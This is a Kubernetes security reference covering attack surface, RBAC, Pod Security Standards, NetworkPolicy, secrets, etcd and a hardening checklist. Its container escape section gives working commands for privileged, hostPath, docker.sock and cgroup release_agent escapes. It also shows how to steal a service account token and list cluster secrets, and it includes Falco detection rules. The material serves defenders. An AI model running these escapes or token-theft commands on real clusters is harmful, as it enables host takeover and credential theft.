# Kubernetes Security Reference

> A comprehensive reference for Kubernetes security — attack surface mapping, RBAC deep dives,
> container escape techniques, Pod Security Standards, NetworkPolicy, secrets management,
> supply chain security, etcd hardening, and a full security checklist.

---

## Table of Contents

1. [Kubernetes Attack Surface](#1-kubernetes-attack-surface)
2. [K8s RBAC Deep Dive](#2-k8s-rbac-deep-dive)
3. [Container Escape Techniques](#3-container-escape-techniques)
4. [Kubernetes Security Scanning Tools](#4-kubernetes-security-scanning-tools)
5. [Pod Security Standards (PSS)](#5-pod-security-standards-pss)
6. [Network Policies](#6-network-policies)
7. [Secrets Management in Kubernetes](#7-secrets-management-in-kubernetes)
8. [Supply Chain Security for K8s](#8-supply-chain-security-for-k8s)
9. [etcd Security](#9-etcd-security)
10. [K8s Security Hardening Checklist](#10-k8s-security-hardening-checklist)

---

## 1. Kubernetes Attack Surface

### Core Components

| Component | Default Port | Role | Attack Risk |
|-----------|-------------|------|------------|
| API Server | 6443 | Central control plane — all kubectl commands go through it | Exposed credentials, misconfigured RBAC |
| etcd | 2379/2380 | Stores all cluster state including Secrets in base64 (NOT encrypted by default) | Unencrypted secrets, direct access bypasses auth |
| kubelet | 10250 | Agent on each node — handles pod lifecycle, exposes node API | Anonymous auth allows exec in containers |
| kube-proxy | N/A | Maintains iptables/ipvs rules for Service routing | Lateral movement via service mesh abuse |
| Controller Manager | 10257 | Reconciles desired vs actual state | Privilege escalation via SA token management |
| Scheduler | 10259 | Assigns pods to nodes | Malicious pod scheduling via schedule manipulation |
| CoreDNS | 53 | Cluster DNS resolution | DNS hijacking, data exfiltration via DNS |
| Dashboard | 8001 (proxy) | Web UI for cluster management | Admin access without auth if misconfigured |
| NodePort | 30000-32767 | Exposes services externally | Direct service exposure bypassing ingress |

### etcd — The Crown Jewel

etcd stores **all cluster state**: Secrets, ConfigMaps, pod specs, RBAC rules, certificates.

```bash
# Check if etcd is exposed (should fail without client cert)
curl http://etcd-ip:2379/version

# Read raw secret from etcd (if you have access)
etcdctl --endpoints=https://127.0.0.1:2379   --cacert=/etc/kubernetes/pki/etcd/ca.crt   --cert=/etc/kubernetes/pki/etcd/server.crt   --key=/etc/kubernetes/pki/etcd/server.key   get /registry/secrets/default/my-secret | hexdump -C

# Without encryption at rest, secrets are base64-encoded plaintext in etcd
# With AES-CBC, value starts with: k8s:enc:aescbc:v1:key1:
```

**Defenses:**
- Encrypt etcd at rest (see Section 7)
- mTLS for all etcd client-to-peer and peer-to-peer communication
- etcd should only be reachable from API server (firewall/network policy)
- Rotate etcd encryption key annually

### API Server Attack Vectors

```
1. Unauthenticated access: --anonymous-auth=true (default in older versions)
2. Leaked kubeconfig: credentials in CI/CD env vars, git repos, pod specs
3. SSRF to cloud metadata → kubeconfig → API access
4. Compromised pod → SA token → API access
5. Direct etcd access → bypass authentication entirely
6. Kubelet exploit → node access → extract all SA tokens on node
```

---

## 2. K8s RBAC Deep Dive

### RBAC Object Model

| Object | Scope | Purpose |
|--------|-------|---------|
| `Role` | Namespace | Grants permissions within a single namespace |
| `ClusterRole` | Cluster-wide | Grants permissions cluster-wide, or reusable across namespaces |
| `RoleBinding` | Namespace | Binds a Role or ClusterRole to subjects within a namespace |
| `ClusterRoleBinding` | Cluster-wide | Binds a ClusterRole to subjects cluster-wide |

Service accounts are the identity for pods — they receive a JWT token automatically mounted at
`/var/run/secrets/kubernetes.io/serviceaccount/token` (unless disabled).

### Dangerous Permissions

| Permission | Risk |
|-----------|------|
| `*` on `*` (wildcard) | Full cluster admin — equivalent to root |
| `pods/exec` | Execute commands in any pod — interactive shell access |
| `secrets` get/list | Read all secrets including credentials and API tokens |
| `create pods` | Escape via privileged container, hostPath mount, or token theft |
| `create deployments` | Launch privileged workload with any spec |
| `update configmaps` | Modify ConfigMaps used as config by other pods |
| `impersonate` | Impersonate any user/serviceaccount — full identity theft |
| `nodes/proxy` | Proxy to kubelet — enables exec in pods on that node |
| `bind clusterroles` | Escalate own privileges by binding cluster-admin |
| `create tokenrequests` | Generate arbitrary SA tokens for any service account |
| `patch nodes` | Taint/drain nodes or modify node labels |

### Finding Overprivileged Roles

```bash
# List all ClusterRoleBindings with cluster-admin subjects
kubectl get clusterrolebindings -o json |   jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'

# Check what a service account can do
kubectl auth can-i --list --as system:serviceaccount:default:my-sa

# Find all bindings for a service account
kubectl get rolebindings,clusterrolebindings --all-namespaces -o json |   jq '.items[] | select(.subjects[]?.name=="my-sa")'

# Audit with rakkess (access matrix view)
kubectl-rakkess

# rbac-tool for visualization and lookup
kubectl-rbac-tool lookup my-user

# Check if anonymous user has any access
kubectl auth can-i --list --as system:anonymous
```

### Least Privilege Service Account

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-sa
  namespace: production
automountServiceAccountToken: false  # Don't auto-mount token

---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-role
  namespace: production
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    resourceNames: ["app-config"]   # Specific resource name — not all configmaps
    verbs: ["get"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-rolebinding
  namespace: production
subjects:
  - kind: ServiceAccount
    name: app-sa
    namespace: production
roleRef:
  kind: Role
  apiGroup: rbac.authorization.k8s.io
  name: app-role
```

### RBAC Audit Tools

```bash
# rakkess — access matrix for any user/SA
kubectl krew install rakkess
kubectl rakkess --as system:serviceaccount:default:my-sa

# rbac-police — evaluate RBAC policies against rule sets
rbac-police eval -f rules/

# rbac-view — visualize RBAC in browser
kubectl krew install rbac-view
kubectl rbac-view

# KubiScan — scan RBAC for risky permissions
python3 KubiScan.py -rs  # Scan for risky subjects
python3 KubiScan.py -rr  # Scan for risky roles
```

---

## 3. Container Escape Techniques

### Privileged Container Escape

If a container runs with `securityContext.privileged: true`, it has near-full access to the host:

```bash
# Inside privileged container — mount host filesystem
ls /dev/          # Shows all host devices (sda, sdb, etc.)
mount /dev/sda1 /mnt/
chroot /mnt/ /bin/bash   # Full host root shell
```

**Detection:** Falco rule `Launch Privileged Container`; API server audit log shows `privileged: true` in pod spec.

### hostPath Volume Escape

```yaml
# Malicious pod spec requesting full host root
volumes:
  - name: host-root
    hostPath:
      path: /   # Mount entire host root filesystem
containers:
  - name: escape
    image: ubuntu
    volumeMounts:
      - mountPath: /host
        name: host-root
    command: ["chroot", "/host", "/bin/bash"]
```

**Prevention:** OPA Gatekeeper/Kyverno policy blocking `hostPath` volumes, or PSS Restricted profile.

### docker.sock Escape

```bash
# If /var/run/docker.sock is mounted inside the container
docker -H unix:///var/run/docker.sock   run -v /:/host --privileged ubuntu   chroot /host bash
# → Full root on host node
```

### CAP_SYS_ADMIN Escape (cgroup notify)

```bash
# Exploit cgroup v1 release_agent with CAP_SYS_ADMIN
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*//p' /etc/mtab)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > /tmp/output" >> /cmd
chmod a+x /cmd
echo 0 > /tmp/cgrp/x/cgroup.procs   # Trigger the release agent
cat /tmp/output                       # Running as host root
```

### Token-Based Lateral Movement

```bash
# From compromised pod — read mounted service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Query API server using stolen token
curl -s --cacert $CACERT   -H "Authorization: Bearer $TOKEN"   https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets

# List all pods cluster-wide (if SA has that permission)
curl -s --cacert $CACERT   -H "Authorization: Bearer $TOKEN"   https://kubernetes.default.svc/api/v1/pods
```

### Notable CVEs

| CVE | Severity | Description |
|-----|----------|-------------|
| CVE-2022-0185 | Critical (CVSS 8.4) | Linux kernel heap overflow in file system context — container escape to host |
| CVE-2021-25741 | High | symlink exchange attack via hostPath volume — read arbitrary host files |
| CVE-2019-5736 | Critical | runc container breakout via /proc/self/exe overwrite |
| CVE-2018-1002105 | Critical | API server privilege escalation via websocket upgrade request |
| CVE-2020-8558 | Medium | Route propagation bug allows access to localhost services on node |

---

## 4. Kubernetes Security Scanning Tools

### kube-bench (CIS Benchmark)

Runs CIS Kubernetes Benchmark checks against the live cluster.

```bash
# Run all checks as a Kubernetes Job
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs job/kube-bench

# Run locally against master/node/etcd
kube-bench run --targets master,node,etcd,policies

# Run a specific check
kube-bench run --check 1.2.1,1.2.2,4.2.1

# Output to JSON for SIEM ingestion
kube-bench run --json --outputfile /tmp/kube-bench.json
```

Sample findings: `[FAIL] 1.2.6 Ensure that the --authorization-mode argument is not set to AlwaysAllow`.

### kube-hunter (Active Pentesting)

Actively hunts for weaknesses in Kubernetes clusters.

```bash
# Remote scan from outside cluster
kube-hunter --remote 10.0.0.1

# In-cluster scan (deploy as a Pod)
kube-hunter --pod

# Passive scan only (no exploitation — safe for production)
kube-hunter --remote 10.0.0.1 --passive

# JSON output
kube-hunter --remote 10.0.0.1 --report json > findings.json
```

Key findings kube-hunter looks for: anonymous authentication, read-only kubelet port (10255),
exposed etcd, exposed dashboard, insecure API server, open RBAC.

### Trivy for Kubernetes

```bash
# Scan entire cluster
trivy k8s --report all cluster

# Summary report for a namespace
trivy k8s --report summary --namespace production

# Scan a specific deployment
trivy k8s deployment/myapp

# Scan with SARIF output for GitHub Security tab
trivy k8s --format sarif --output trivy-k8s.sarif cluster
```

### Kubescape (NSA/MITRE Framework Compliance)

```bash
# Scan against NSA framework
kubescape scan framework NSA

# Scan against MITRE ATT&CK
kubescape scan framework MITRE

# Scan a specific namespace
kubescape scan framework NSA --namespace production

# Scan a Helm chart
kubescape scan helm ./mychart/

# Export results as JSON
kubescape scan framework NSA --format json --output results.json
```

### Falco (Runtime Detection)

```bash
# Install with Helm (eBPF driver recommended)
helm install falco falcosecurity/falco   -n falco --create-namespace   --set driver.kind=ebpf   --set falcosidekick.enabled=true

# Custom rule example
cat > /etc/falco/custom_rules.yaml << 'EOF'
- rule: Shell Spawned in Container
  desc: Detect interactive shell in container
  condition: >
    spawned_process and container and
    proc.name in (bash, sh, zsh, fish, ksh) and
    not proc.pname in (allowed_k8s_shell_parents)
  output: >
    Shell spawned in container
    (container=%container.name user=%user.name proc=%proc.name cmd=%proc.cmdline)
  priority: WARNING
  tags: [container, shell, T1059]

- rule: Kubernetes Secret Access
  desc: Detect access to Kubernetes secret files
  condition: >
    open_read and container and
    fd.name startswith /var/run/secrets/kubernetes.io/serviceaccount
  output: >
    K8s SA token accessed
    (file=%fd.name container=%container.name cmd=%proc.cmdline)
  priority: INFO
  tags: [container, credential_access]
EOF

falco -r /etc/falco/custom_rules.yaml
```

### Polaris (Best Practices)

```bash
# Audit manifests
polaris audit --audit-path ./manifests --format json

# Run as admission webhook (blocks deployments failing checks)
helm install polaris fairwinds-stable/polaris   --set webhook.enable=true

# Check score
polaris audit --audit-path ./manifests --format score
```

---

## 5. Pod Security Standards (PSS)

Replaced PodSecurityPolicy (PSP) in Kubernetes 1.25+. Three built-in profiles enforced via
namespace admission controller labels.

### Three Profiles

| Profile | Restrictions | Use Case |
|---------|-------------|----------|
| **Privileged** | None — unrestricted | Infrastructure workloads (CNI plugins, CSI drivers, node agents) |
| **Baseline** | Prevents known privilege escalations | General application workloads (minimum sensible default) |
| **Restricted** | Heavily restricted, follows security best practices | High-security production workloads |

### Apply via Namespace Labels

```bash
# Enforce restricted policy on namespace
kubectl label namespace production   pod-security.kubernetes.io/enforce=restricted   pod-security.kubernetes.io/enforce-version=latest   pod-security.kubernetes.io/warn=restricted   pod-security.kubernetes.io/warn-version=latest   pod-security.kubernetes.io/audit=restricted   pod-security.kubernetes.io/audit-version=latest

# Check current namespace labels
kubectl get namespace production --show-labels
```

### Restricted Profile Requirements

```yaml
# All of the following must be set correctly
spec:
  hostNetwork: false         # Not allowed
  hostPID: false             # Not allowed
  hostIPC: false             # Not allowed
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000          # Must be non-zero
    runAsGroup: 3000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault   # Or Localhost with custom profile
  containers:
    - securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
          add: []            # No added capabilities in Restricted
      # volumes: only emptyDir, configMap, projected, secret, downwardAPI, csi, ephemeral
      # No hostPath volumes
```

### Dry-Run Mode (Test Before Enforcing)

```bash
# Simulate enforcement — shows violations without blocking
kubectl label namespace staging   pod-security.kubernetes.io/enforce=restricted   --dry-run=server

# Use warn mode first to discover violations
kubectl label namespace staging   pod-security.kubernetes.io/warn=restricted
kubectl get events -n staging | grep Warning
```

---

## 6. Network Policies

By default, all pods in a Kubernetes cluster can communicate with all other pods — there is zero
network segmentation. NetworkPolicy resources require a CNI plugin that enforces them.

### CNI Plugin Support

| CNI | NetworkPolicy | eBPF | L7 Policy | Notes |
|-----|--------------|------|-----------|-------|
| Calico | Full + GlobalNetworkPolicy | Yes | Limited | Widely deployed, mature |
| Cilium | Full + CiliumNetworkPolicy | Native | Yes (HTTP/gRPC) | Best observability (Hubble UI) |
| Weave Net | Full | No | No | No longer actively maintained |
| Flannel | None | No | No | Simple overlay — does NOT enforce NetworkPolicy |
| AWS VPC CNI | Full (with Calico) | No | No | Use Calico for NetworkPolicy on EKS |

### Default Deny All Ingress

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: production
spec:
  podSelector: {}    # Selects ALL pods in namespace
  policyTypes: ["Ingress"]
  # No ingress rules = deny all inbound traffic
```

### Allow Specific Communication

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-api
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: api-server
  policyTypes: ["Ingress"]
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: frontend
        - namespaceSelector:
            matchLabels:
              purpose: monitoring   # Allow monitoring namespace
      ports:
        - protocol: TCP
          port: 8080
```

### Allow DNS Egress (Essential for Most Workloads)

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: production
spec:
  podSelector: {}
  policyTypes: ["Egress"]
  egress:
    - ports:
        - protocol: UDP
          port: 53
        - protocol: TCP
          port: 53
```

### Cilium L7 NetworkPolicy (HTTP/gRPC Layer)

```yaml
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: l7-policy
spec:
  endpointSelector:
    matchLabels:
      app: api-server
  ingress:
    - fromEndpoints:
        - matchLabels:
            app: frontend
      toPorts:
        - ports:
            - port: "8080"
          rules:
            http:
              - method: "GET"
                path: "/api/.*"    # L7: only allow GET requests to /api/*
              - method: "POST"
                path: "/api/data"
```

### Network Policy Testing

```bash
# Test connectivity between pods (use netshoot)
kubectl run test --image=nicolaka/netshoot --rm -it -- bash
# Inside test pod:
curl http://api-server.production.svc.cluster.local:8080/health
nc -zv api-server.production.svc.cluster.local 8080

# List all NetworkPolicies
kubectl get networkpolicies --all-namespaces

# Describe a policy
kubectl describe networkpolicy default-deny-ingress -n production
```

---

## 7. Secrets Management in Kubernetes

### Native K8s Secrets (Base64, NOT Encrypted by Default)

```bash
# Create secret
kubectl create secret generic db-creds   --from-literal=username=admin   --from-literal=password=S3cr3t!

# View secret (base64 encoded)
kubectl get secret db-creds -o yaml

# Decode
kubectl get secret db-creds -o jsonpath='{.data.password}' | base64 -d

# Read raw etcd value (base64 — demonstrates NO encryption by default)
etcdctl get /registry/secrets/default/db-creds
```

### Encryption at Rest

```yaml
# /etc/kubernetes/encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources: ["secrets"]
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: BASE64_32BYTE_KEY   # Generate: head -c 32 /dev/urandom | base64
      - identity: {}   # Fallback for reading unencrypted existing secrets
```

```bash
# Apply to API server
kube-apiserver --encryption-provider-config=/etc/kubernetes/encryption-config.yaml

# Re-encrypt all existing secrets
kubectl get secrets --all-namespaces -o json | kubectl replace -f -

# Verify: etcd raw value should now start with "k8s:enc:aescbc:v1:key1:"
etcdctl get /registry/secrets/default/db-creds | hexdump -C | head -5
```

### External Secrets Operator (ESO)

Syncs secrets from AWS Secrets Manager, Azure Key Vault, HashiCorp Vault, GCP Secret Manager.

```yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: aws-secrets-manager
    kind: ClusterSecretStore
  target:
    name: db-credentials
  data:
    - secretKey: password
      remoteRef:
        key: prod/myapp/db
        property: password
```

### Vault Agent Injector (HashiCorp Vault)

```yaml
# Pod annotations trigger automatic secret injection via sidecar
annotations:
  vault.hashicorp.com/agent-inject: "true"
  vault.hashicorp.com/role: "myapp"
  vault.hashicorp.com/agent-inject-secret-config: "secret/data/myapp/config"
  vault.hashicorp.com/agent-inject-template-config: |
    {{- with secret "secret/data/myapp/config" -}}
    export DB_PASSWORD="{{ .Data.data.password }}"
    export API_KEY="{{ .Data.data.api_key }}"
    {{- end }}
```

### Secrets Store CSI Driver

```yaml
# Mount secrets as files using CSI driver (supports Vault, AWS, Azure, GCP)
volumes:
  - name: secrets-store
    csi:
      driver: secrets-store.csi.k8s.io
      readOnly: true
      volumeAttributes:
        secretProviderClass: my-provider

---
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: my-provider
spec:
  provider: aws
  parameters:
    objects: |
      - objectName: "prod/myapp/db"
        objectType: "secretsmanager"
        objectAlias: "db-password"
```

### Sealed Secrets (GitOps-Safe)

```bash
# Encrypt a secret client-side with public key from controller
kubectl create secret generic db-pass   --from-literal=password=S3cr3t!   --dry-run=client -o yaml |   kubeseal --format yaml > sealed-secret.yaml

# Sealed secret is safe to commit to Git
kubectl apply -f sealed-secret.yaml
# Controller in cluster decrypts and creates the actual Secret
```

---

## 8. Supply Chain Security for K8s

### Kyverno — Image Signature Verification Policy

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  rules:
    - name: verify-signature
      match:
        resources:
          kinds: ["Pod"]
      verifyImages:
        - imageReferences: ["gcr.io/myproject/*"]
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/myorg/myrepo/.github/workflows/build.yml@refs/heads/main"
                    issuer: "https://token.actions.githubusercontent.com"
```

### OPA Gatekeeper Policies

```yaml
# Constraint: require team/app/environment labels on Deployments
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: RequiredLabels
metadata:
  name: require-team-label
spec:
  match:
    kinds:
      - apiGroups: ["apps"]
        kinds: ["Deployment", "StatefulSet"]
      - apiGroups: [""]
        kinds: ["Namespace"]
  parameters:
    labels: ["team", "environment", "owner"]

---
# ConstraintTemplate backing the above
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: requiredlabels
spec:
  crd:
    spec:
      names:
        kind: RequiredLabels
      validation:
        openAPIV3Schema:
          properties:
            labels:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package requiredlabels
        violation[{"msg": msg}] {
          required := {label | label := input.parameters.labels[_]}
          provided := {label | input.review.object.metadata.labels[label]}
          missing := required - provided
          count(missing) > 0
          msg := sprintf("Missing required labels: %v", [missing])
        }
```

### SLSA Provenance in CI/CD

```yaml
# GitHub Actions: build, sign, and attest
name: Secure Build
on:
  push:
    branches: [main]
permissions:
  id-token: write
  contents: read
  packages: write
  attestations: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build image
        run: docker build -t ghcr.io/myorg/myapp:${{ github.sha }} .
      - name: Push image
        run: docker push ghcr.io/myorg/myapp:${{ github.sha }}
      - uses: sigstore/cosign-installer@v3
      - name: Sign image (keyless OIDC)
        run: |
          cosign sign             --rekor-url https://rekor.sigstore.dev             ghcr.io/myorg/myapp:${{ github.sha }}
      - name: Generate SBOM
        run: |
          syft image ghcr.io/myorg/myapp:${{ github.sha }}             -o spdx-json > sbom.spdx.json
      - name: Attest SBOM
        run: |
          cosign attest             --predicate sbom.spdx.json             --type spdxjson             ghcr.io/myorg/myapp:${{ github.sha }}
```

### Conftest (Policy-as-Code in CI)

```bash
# Test Kubernetes manifests before applying
conftest test deployment.yaml -p policy/

# Example policy: deny images with :latest tag
cat policy/deny_latest.rego
```

```rego
package kubernetes

deny[msg] {
  input.kind == "Deployment"
  container := input.spec.template.spec.containers[_]
  endswith(container.image, ":latest")
  msg := sprintf("Image '%v' uses :latest tag — pin to specific digest", [container.image])
}

deny[msg] {
  input.kind == "Pod"
  container := input.spec.containers[_]
  not contains(container.image, "@sha256:")
  msg := sprintf("Container '%v' image not pinned to digest", [container.name])
}
```

---

## 9. etcd Security

etcd is the most sensitive component in a Kubernetes cluster. Compromise of etcd equals
compromise of the entire cluster — all secrets, RBAC rules, and service account tokens are stored there.

### Hardening Checklist

```bash
# 1. Verify etcd is NOT accessible without client certificates
curl http://etcd-ip:2379/version          # Should fail/timeout
curl --cert --key https://etcd-ip:2379/version  # Should require certs

# 2. Verify encrypted peer-to-peer communication
# All etcd flags should include:
# --peer-cert-file, --peer-key-file, --peer-client-cert-auth=true

# 3. Verify etcd is not listening on public interfaces
ss -tlnp | grep 2379   # Should only show 127.0.0.1 or internal IP

# 4. Check etcd is running as non-root
ps aux | grep etcd
```

### Secure etcd Access

```bash
etcdctl --endpoints=https://127.0.0.1:2379   --cacert=/etc/kubernetes/pki/etcd/ca.crt   --cert=/etc/kubernetes/pki/etcd/server.crt   --key=/etc/kubernetes/pki/etcd/server.key   get /registry/secrets/default/my-secret

# List all secrets (demonstrates blast radius of etcd compromise)
etcdctl --endpoints=https://127.0.0.1:2379   --cacert=/etc/kubernetes/pki/etcd/ca.crt   --cert=/etc/kubernetes/pki/etcd/server.crt   --key=/etc/kubernetes/pki/etcd/server.key   get /registry/secrets/ --prefix --keys-only
```

### etcd Backup Security

```bash
# Create snapshot (contains ALL cluster secrets)
etcdctl snapshot save /backup/etcd-snapshot-$(date +%Y%m%d).db

# Verify snapshot integrity
etcdctl snapshot status /backup/etcd-snapshot.db --write-out=table

# CRITICAL: Protect backup with:
# - Encryption at rest on backup storage
# - Strict access controls (only backup operator role)
# - Offsite replication to encrypted S3/GCS bucket
# - Backup rotation (keep 30 days, archive 1 year)

# Restore from snapshot
etcdctl snapshot restore /backup/etcd-snapshot.db   --data-dir=/var/lib/etcd-restore   --initial-cluster=master=https://127.0.0.1:2380   --initial-advertise-peer-urls=https://127.0.0.1:2380   --name=master
```

### etcd Encryption Key Rotation

```bash
# 1. Add new key to encryption config (keep old key as secondary)
# 2. Restart API server with new config
# 3. Re-encrypt all secrets: kubectl get secrets --all-namespaces -o json | kubectl replace -f -
# 4. Remove old key from config
# 5. Restart API server again
# Repeat for ConfigMaps if also encrypted
```

---

## 10. K8s Security Hardening Checklist

```
API SERVER
[ ] Enable RBAC authorization (--authorization-mode=Node,RBAC)
[ ] Disable anonymous authentication (--anonymous-auth=false)
[ ] Disable insecure port (--insecure-port=0)
[ ] Enable audit logging (--audit-log-path, --audit-policy-file, --audit-log-maxage=30)
[ ] Enable admission controllers: PodSecurity, NodeRestriction, EventRateLimit
[ ] Configure secrets encryption at rest (AES-CBC or AES-GCM)
[ ] API server not publicly accessible (private endpoint, VPN, or firewall)
[ ] Disable profiling (--profiling=false)
[ ] Set TLS minimum version (--tls-min-version=VersionTLS12)
[ ] Enable service account token volume projection

etcd
[ ] Enable mTLS for client and peer communication
[ ] Bind only to internal/loopback interfaces (not 0.0.0.0)
[ ] Enable encryption at rest for secrets
[ ] Restrict filesystem permissions on etcd data directory (700)
[ ] Rotate etcd certificates annually
[ ] Encrypt etcd backups and restrict access

NODES
[ ] Disable kubelet anonymous auth (--anonymous-auth=false)
[ ] Disable kubelet read-only port (--read-only-port=0)
[ ] Set kubelet authorization mode to Webhook (--authorization-mode=Webhook)
[ ] Apply CIS benchmark to node OS (kube-bench)
[ ] Use containerd or CRI-O (not Docker daemon)
[ ] Enable seccomp RuntimeDefault as default profile
[ ] Restrict SSH access to nodes (no direct SSH from workload network)

WORKLOADS
[ ] Enforce Pod Security Standards (restricted level) on production namespaces
[ ] No privileged containers (OPA/Gatekeeper policy)
[ ] No hostPath volumes (or very restricted whitelist)
[ ] All containers run as non-root (runAsNonRoot: true)
[ ] Resource limits set (CPU + memory) on all containers
[ ] readOnlyRootFilesystem: true on all containers
[ ] Drop ALL capabilities, add only required ones
[ ] Disable automountServiceAccountToken on workload service accounts
[ ] Set seccompProfile: RuntimeDefault on all pods

NETWORKING
[ ] Default deny NetworkPolicy applied in all production namespaces
[ ] Allow DNS egress NetworkPolicy
[ ] Control plane isolated from workload network
[ ] Sensitive services not exposed via NodePort or external LoadBalancer
[ ] Service mesh with mTLS (Istio or Linkerd) for pod-to-pod encryption
[ ] Egress traffic restricted — deny unexpected outbound connections
[ ] CNI plugin supports NetworkPolicy (Calico, Cilium — not Flannel alone)

IMAGES
[ ] All images scanned for vulnerabilities before deployment (Trivy in CI)
[ ] Only signed images allowed (Cosign + Kyverno or Gatekeeper policy)
[ ] Base images are minimal (distroless or Alpine-based)
[ ] No :latest tags — pin to specific digest (image@sha256:...)
[ ] Images rebuilt on base image CVE patches (automated pipeline)
[ ] SBOMs generated and attested for all images (Syft + Cosign attest)

RBAC
[ ] No wildcard (*) permissions in any Role or ClusterRole
[ ] No workload has cluster-admin binding
[ ] Dedicated service accounts per workload
[ ] default SA has no permissions and automount disabled
[ ] Regular RBAC audit (rakkess, rbac-police) — quarterly minimum
[ ] Impersonate permission restricted to ops tooling only

SECRETS
[ ] Secrets encryption at rest enabled in etcd
[ ] No secrets in environment variables — use secretKeyRef or volume mounts
[ ] External Secrets Operator or Vault for secret lifecycle management
[ ] RBAC restricts who can read/list secrets (least privilege)
[ ] No secrets committed to Git (detect with trufflehog, gitleaks)
[ ] Service account tokens use projected volumes with bounded lifetimes

MONITORING & DETECTION
[ ] Falco deployed with eBPF driver for runtime threat detection
[ ] Kubernetes API server audit logs forwarded to SIEM
[ ] CIS benchmark (kube-bench) results reviewed — critical findings remediated
[ ] kube-hunter run in passive mode quarterly for self-assessment
[ ] Alerting on: privilege escalation, exec in pods, secret access, new ClusterRoleBindings
[ ] Container image drift detection (Falco or Prisma Cloud)
[ ] Node anomaly detection (unusual processes, network connections)

SUPPLY CHAIN
[ ] CI/CD pipeline: build → scan (Trivy) → sign (Cosign) → attest SBOM → deploy
[ ] OPA Gatekeeper or Kyverno enforces image signature verification at admission
[ ] Conftest validates manifests in CI before kubectl apply
[ ] Dependencies pinned with checksums (go.sum, package-lock.json, requirements.txt)
[ ] SLSA level 2+ provenance for all production artifacts
[ ] Dependency auto-update with vulnerability scanning (Dependabot + Trivy)
```

---

## Quick Reference: Key Commands

```bash
# Check current user/SA permissions
kubectl auth can-i --list
kubectl auth can-i --list -n production

# Check specific permission
kubectl auth can-i create pods -n production

# Find pods running as root
kubectl get pods --all-namespaces -o json |   jq '.items[] | select(.spec.securityContext.runAsUser==0 or .spec.securityContext.runAsUser==null) | .metadata.name'

# Find privileged containers
kubectl get pods --all-namespaces -o json |   jq '.items[].spec.containers[] | select(.securityContext.privileged==true) | .name'

# Check if secrets are encrypted in etcd
kubectl get secret test-secret -o yaml
# Then compare with etcdctl get /registry/secrets/default/test-secret | hexdump -C

# List all service accounts with mounted tokens
kubectl get pods --all-namespaces -o json |   jq '.items[] | select(.spec.automountServiceAccountToken!=false) | "\(.metadata.namespace)/\(.metadata.name)"'

# Audit images — find :latest tags
kubectl get pods --all-namespaces -o json |   jq -r '.items[].spec.containers[].image' | grep ':latest'

# List namespaces without Pod Security Standards
kubectl get namespaces -o json |   jq -r '.items[] | select(.metadata.labels["pod-security.kubernetes.io/enforce"] == null) | .metadata.name'
```

---

*Last updated: 2026-04-26 | Part of the [TeamStarWolf Cybersecurity Reference Library](README.md)*
